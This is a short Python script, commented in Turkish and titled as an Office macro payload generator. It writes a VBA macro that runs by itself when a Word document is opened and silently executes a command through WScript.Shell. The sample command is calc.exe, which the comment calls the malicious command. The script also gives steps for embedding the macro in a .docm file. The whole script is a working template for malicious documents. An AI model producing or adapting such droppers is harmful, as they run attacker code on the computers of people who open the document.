print("--- OFFICE MACRO PAYLOAD GENERATOR ---")

# Zararlı komut (Örn: Hesap makinesi aç)
payload_cmd = "calc.exe"

vba_code = f"""
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "{payload_cmd}"
    CreateObject("WScript.Shell").Run str, 0
End Sub
"""

with open("payload.vba", "w") as f:
    f.write(vba_code)

print("\n✅ 'payload.vba' oluşturuldu!")
print("Kullanım: Word'ü aç -> ALT+F11 -> Insert Module -> Kodu yapıştır.")
print("Belgeyi '.docm' olarak kaydet.")